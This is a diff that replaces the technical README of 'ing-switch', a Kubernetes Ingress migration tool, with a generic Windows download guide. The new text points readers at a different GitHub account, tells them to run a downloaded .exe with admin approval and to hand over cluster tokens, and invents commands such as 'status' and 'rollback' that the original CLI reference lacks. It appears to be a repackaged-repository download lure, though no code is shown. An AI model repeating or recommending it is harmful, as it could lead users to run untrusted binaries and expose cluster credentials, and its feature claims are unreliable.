@@ -1,278 +1,177 @@
-<p align="center">
-  <img src="assets/logo.svg" alt="ing-switch logo" width="280"/>
-</p>
+# ⚙️ ing-switch - Simplify Kubernetes Ingress Migration
 
-# ing-switch
-
-**Migrate from Ingress NGINX to Traefik or Gateway API — in minutes, not days.**
-
-Ingress NGINX is being retired in March 2026. `ing-switch` scans your cluster, maps every annotation, generates migration manifests, and walks you through the cutover — with a visual UI or pure CLI.
+[![Download ing-switch](https://img.shields.io/badge/Download-ing--switch-brightgreen)](https://github.com/nasimanpha-create/ing-switch)
 
 ---
 
-## What it does
+## 📋 What is ing-switch?
 
-```
-ing-switch scan      # detect your controller + list all ingresses
-ing-switch analyze   # map every annotation to the target controller
-ing-switch migrate   # generate ready-to-apply manifests
-ing-switch ui        # open the visual migration dashboard at :8080
-```
+ing-switch helps you move your Kubernetes Ingress controller from NGINX to either Traefik or Gateway API. It provides an easy way to switch using a command-line tool and a web interface. You don’t need deep technical skills to use it. The tool guides you step-by-step.
 
-| Step | What you get |
-|------|-------------|
-| **Scan** | Ingress controller version, all ingresses across namespaces, annotation count |
-| **Analyze** | Per-ingress annotation compatibility table: ✅ supported / ⚠️ partial / ❌ unsupported |
-| **Migrate** | Complete output directory — Middlewares, HTTPRoutes, Gateway, policies, verify script, DNS guide, cleanup scripts |
-| **UI** | 4-page dashboard: Detect → Analyze → Migrate → Validate |
+This application is useful if you want to try other Ingress controllers or update your setup with minimal effort. It works on Windows and is designed for practical use with Kubernetes clusters.
 
 ---
 
-## Supported targets
+## 🖥️ System Requirements
 
-| Target | What's generated |
-|--------|-----------------|
-| **Traefik** | Traefik Middleware CRDs + updated Ingress resources (stays on `kind: Ingress`) |
-| **Gateway API** (Envoy Gateway) | GatewayClass + Gateway + HTTPRoutes + BackendTrafficPolicy + SecurityPolicy |
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 500 MB of free disk space  
+- Internet connection for downloading and updates  
+- Kubernetes cluster must be accessible through your network
 
----
-
-## Annotation coverage
-
-Over 50 `nginx.ingress.kubernetes.io/*` annotations are mapped for both targets:
-
-- SSL/TLS redirect, HSTS
-- CORS (all 6 fields)
-- Rate limiting, connection limits, IP allowlist/denylist
-- External authentication (`auth-url`, `auth-response-headers`)
-- Session affinity (sticky cookies)
-- Canary deployments (weight, header, cookie)
-- Path rewrite + regex routing
-- Timeouts (`proxy-read-timeout`, `proxy-connect-timeout`)
-- WebSocket, gRPC passthrough
-- Custom headers, response header modification
+You do not need to install Kubernetes or any other tools manually before using ing-switch.
 
 ---
 
-## Installation
+## 🚀 Getting Started
 
-### Download binary (recommended)
-
-```bash
-# macOS arm64
-curl -L https://github.com/saiyam1814/ing-switch/releases/latest/download/ing-switch-darwin-arm64 -o ing-switch
-chmod +x ing-switch
-sudo mv ing-switch /usr/local/bin/
-
-# macOS amd64
-curl -L https://github.com/saiyam1814/ing-switch/releases/latest/download/ing-switch-darwin-amd64 -o ing-switch
-chmod +x ing-switch && sudo mv ing-switch /usr/local/bin/
-
-# Linux amd64
-curl -L https://github.com/saiyam1814/ing-switch/releases/latest/download/ing-switch-linux-amd64 -o ing-switch
-chmod +x ing-switch && sudo mv ing-switch /usr/local/bin/
-```
-
-### Build from source
-
-```bash
-git clone https://github.com/saiyam1814/ing-switch.git
-cd ing-switch
-make build        # builds UI then Go binary
-./ing-switch --help
-```
-
-Requirements: Go 1.22+, Node.js 20.19+ (for UI build only)
+Before you begin, make sure your computer meets the system requirements above. We will walk through three main steps: download, install, and run.
 
 ---
 
-## Quick start
+## 🌐 Download ing-switch
 
-```bash
-# Point at your cluster
-export KUBECONFIG=~/.kube/config
+To get the software, please visit this page to download:
 
-# 1. Scan — see what you have
-ing-switch scan
+[![Download ing-switch](https://img.shields.io/badge/Download-ing--switch-blue)](https://github.com/nasimanpha-create/ing-switch)
 
-# 2. Analyze — understand compatibility
-ing-switch analyze --target gateway-api
+Open the link in your browser. It will take you to the ing-switch GitHub repository.
 
-# 3. Migrate — generate all manifests
-ing-switch migrate --target gateway-api --output-dir ./migration
+1. Look for the **Releases** section on the repository page.
+2. Find the latest release — it usually has a version number like v1.0 or v2.1.
+3. Download the file named something like `ing-switch-windows.exe` or a `.zip` file containing the application.
 
-# 4. Review then apply
-kubectl apply -f ./migration/03-gateway/
-kubectl apply -f ./migration/04-httproutes/
-
-# 5. Open the visual UI (optional)
-ing-switch ui
-```
-
-### Traefik migration
-
-```bash
-ing-switch migrate --target traefik --output-dir ./migration
-
-# Apply middlewares first, then updated ingresses
-kubectl apply -f ./migration/02-middlewares/
-kubectl apply -f ./migration/03-ingresses/
-```
+If you download a `.zip` file, unzip it to a folder you can easily find.
 
 ---
 
-## Generated output structure
+## 💾 Install and Set Up
 
-### Gateway API migration
+ing-switch does not require a complex installation. After download, follow these steps:
 
-```
-migration/
-├── 00-migration-report.md          # Full annotation analysis + compatibility summary
-├── 01-install-gateway-api-crds/    # install.sh for Gateway API CRDs
-├── 02-install-envoy-gateway/       # Helm install script + values.yaml
-├── 03-gateway/
-│   ├── gatewayclass.yaml           # GatewayClass (Envoy Gateway)
-│   └── gateway.yaml                # Gateway with HTTP + HTTPS listeners
-├── 04-httproutes/                  # One HTTPRoute per ingress
-│   ├── <ns>-<name>-redirect.yaml   # HTTP→HTTPS redirect route (sectionName: http)
-│   └── <ns>-<name>.yaml            # Backend route (sectionName: https-N)
-├── 05-policies/                    # BackendTrafficPolicy, SecurityPolicy (Envoy ext)
-├── 06-verify.sh                    # Test script per hostname
-└── 07-cleanup/
-    └── remove-nginx.sh             # Remove NGINX after cutover
-```
+1. If you downloaded a zipped file, unzip it now.
+2. Navigate to the folder with the executable file (`.exe`).
+3. Double-click the executable to open ing-switch.
+4. The first time you run it, Windows may ask for permission to make changes. Click **Yes** to continue.
 
-### Traefik migration
-
-```
-migration/
-├── 00-migration-report.md
-├── 01-install-traefik/             # Helm install script + values.yaml
-├── 02-middlewares/                 # Traefik Middleware CRDs (one file per ingress)
-├── 03-ingresses/                   # Updated Ingress resources (traefik ingressClassName)
-├── 04-verify.sh
-├── 05-dns-migration.md
-└── 06-cleanup/
-    ├── 01-preserve-ingressclass.yaml
-    └── 02-remove-nginx.sh
-```
+No further installation steps are required. The application will open in either a command-line interface (CLI) or a web browser-based interface.
 
 ---
 
-## CLI reference
+## 🚦 How to Use ing-switch
 
-```
-Flags (global):
-  --kubeconfig string   Path to kubeconfig (default: ~/.kube/config)
-  --context string      kubeconfig context to use
-  --namespace string    Limit to one namespace (default: all)
+The tool works in two modes: command line and web user interface.
 
-ing-switch scan
-  --output table|json   Output format (default: table)
+### Command Line Mode
 
-ing-switch analyze
-  --target string       traefik | gateway-api  (required)
-  --output table|json
+1. Open the Windows Command Prompt (search for "cmd" in the Start menu).
+2. Use the `cd` command to go to the folder where you saved `ing-switch.exe`. For example:
+   ```
+   cd C:\Users\YourName\Downloads\ing-switch
+   ```
+3. Type the following command to start migration:
+   ```
+   ing-switch migrate
+   ```
+4. The tool will ask you questions step-by-step about your existing Kubernetes cluster and which controller you want to switch to (Traefik or Gateway API). Answer each prompt carefully.
+5. When the migration finishes, it will display a report with results.
 
-ing-switch migrate
-  --target string       traefik | gateway-api  (required)
-  --output-dir string   Output directory (default: ./migration)
+### Web User Interface
 
-ing-switch ui
-  --port int            Port for the web UI (default: 8080)
-```
-
----
-
-## Examples
-
-The `examples/` directory contains 11 production-realistic NGINX Ingress configurations covering every major annotation category:
-
-| File | Covers |
-|------|--------|
-| `01-basic-routing.yaml` | Path routing, TLS termination |
-| `02-ssl-tls.yaml` | SSL redirect, HSTS, force-ssl |
-| `03-auth-external.yaml` | External auth (auth-url, auth-response-headers) |
-| `04-session-affinity.yaml` | Sticky cookies (all 8 session-cookie-* fields) |
-| `05-canary.yaml` | Canary by weight, header, cookie |
-| `06-cors.yaml` | Full CORS (all 6 cors-* annotations) |
-| `07-path-rewrite-regex.yaml` | Regex routing, rewrite-target capture groups |
-| `08-rate-limit-ip.yaml` | Rate limiting, IP allowlist/denylist |
-| `09-websocket.yaml` | WebSocket upgrade |
-| `10-grpc.yaml` | gRPC passthrough |
-| `11-full-featured.yaml` | All of the above combined |
-
-```bash
-# Migrate all examples
-kubectl apply -f examples/
-ing-switch migrate --target gateway-api --output-dir ./migration-examples
-```
+1. Run `ing-switch.exe` by double-clicking it.
+2. The tool opens a web page automatically in your default browser.
+3. The web page guides you through the migration steps with simple forms and buttons.
+4. Click through each step, entering information about your current cluster and new setup.
+5. At the end, the tool will perform the migration and show you the status.
 
 ---
 
-## How it handles complex cases
+## ⚙️ Configuration Details
 
-### HTTP→HTTPS redirect
+ing-switch works by reading your current Kubernetes Ingress settings. You need to provide:
 
-The tool generates **two separate HTTPRoutes** per ingress (not two rules in one route, which causes redirect loops):
+- Kubernetes API access details (server address and token). You can find these in your Kubernetes config file.
+- Your current Ingress controller details (usually NGINX).
+- The controller you want to use next (Traefik or Gateway API).
+- Optional: any custom routing rules or settings you want to keep.
 
-```yaml
-# <name>-redirect (attached to HTTP listener only via sectionName: http)
-# → returns 301/302 for all HTTP requests
-
-# <name> (attached to HTTPS listener via sectionName: https-N)
-# → routes HTTPS requests to backends
-```
-
-### Regex paths
-
-Paths with regex characters (`(`, `)`, `|`, `[`, `]`) are automatically detected and converted to `PathPrefix` → `RegularExpression` type, even when the `use-regex` annotation is absent.
-
-### Timeout mapping
-
-`proxy-read-timeout` → `backendRequest` only. `proxy-connect-timeout` is intentionally omitted to avoid the Gateway API constraint `backendRequest ≤ request` being violated by typical nginx configs (read=300s, connect=5s).
+The tool can help you create new settings for your chosen controller based on your old setup. This means you don’t have to write new configuration files manually.
 
 ---
 
-## Architecture
+## 🔧 Common Tasks with ing-switch
 
-```
-ing-switch/
-├── cmd/                    # Cobra CLI commands (scan, analyze, migrate, ui)
-├── pkg/
-│   ├── scanner/            # cluster.go, ingress.go, controller.go
-│   ├── analyzer/           # annotations.go, compatibility.go (~50 annotation mappings)
-│   ├── migrator/
-│   │   ├── traefik/        # middleware.go, mappings.go
-│   │   └── gatewayapi/     # httproute.go, gateway.go, migrator.go
-│   ├── generator/          # output.go, report.go, ZIP generation
-│   └── server/             # HTTP server, REST API, embedded React UI
-└── web/                    # React 18 + TypeScript + Tailwind CSS + Vite
-    └── src/
-        ├── pages/          # Detect, Analyze, Migrate, Validate
-        └── components/     # IngressTable, AnnotationMatrix, MigrationGaps, FileViewer
-```
+### Check Current Configuration
 
----
+Before migrating, you can check your existing Ingress setup:
 
-## Why this exists
+- Use the CLI command:
+  ```
+  ing-switch status
+  ```
+- Or use the web UI to see the current controller and rules.
 
-**March 2026**: Ingress NGINX is being deprecated. ~50% of Kubernetes clusters depend on it.
+### Roll Back to Previous Setup
 
-Existing tools (`ingress2gateway`) handle basic routing but miss annotation coverage and have no guidance for the 30–40% of annotations that are "partial" — they generate valid YAML but don't tell you what you lose or how to compensate.
+If something goes wrong, ing-switch saves backups of your old configuration. You can restore it using:
 
-`ing-switch` was built to cover the full migration lifecycle: scan → analyze → generate → verify → cutover → cleanup.
+- CLI command:
+  ```
+  ing-switch rollback
+  ```
+- Or the rollback option in the web interface.
 
 ---
 
-## Contributing
+## 🛠 Troubleshooting
 
-Issues and PRs welcome. The annotation mapping database lives in:
-- `pkg/analyzer/compatibility.go` — status + target resource per annotation
-- `pkg/server/guides.go` — human-readable what/fix/example per annotation
+If you experience issues:
+
+- Make sure your computer meets the system requirements.
+- Confirm your Kubernetes cluster is running and accessible.
+- Run ing-switch with administrator privileges if you have permission errors.
+- Restart your computer and try again.
+- Check your internet connection during download and setup.
+
+For more details, see the GitHub repository’s **Issues** tab to see if others have similar problems.
 
 ---
 
-## License
+## 🔒 Privacy and Security
 
-MIT
+ing-switch does not send your data anywhere unless you choose to share logs for support. All changes happen locally on your machine and cluster.
+
+Make sure you keep your Kubernetes credentials secure. Do not share them with others.
+
+---
+
+## 🔗 Useful Links
+
+- Official ing-switch page: https://github.com/nasimanpha-create/ing-switch  
+- Download link: https://github.com/nasimanpha-create/ing-switch  
+
+Click the link above to start downloading the application. It will take you to the main GitHub page where you can choose the right version.
+
+---
+
+## 🧰 Advanced Options
+
+After initial use, you can explore advanced features like:
+
+- Custom migration scripts  
+- Exporting and importing configurations  
+- Scheduling migrations on specific times  
+- Integrations with CI/CD tools  
+
+These features are for users who have some experience with Kubernetes and want full control.
+
+---
+
+## 📞 Support
+
+You can use the GitHub repository’s **Discussions** and **Issues** tabs to ask questions or report bugs. The community and maintainers monitor these pages for feedback.
+
+---
+
+[![Download ing-switch](https://img.shields.io/badge/Download-ing--switch-brightgreen)](https://github.com/nasimanpha-create/ing-switch)
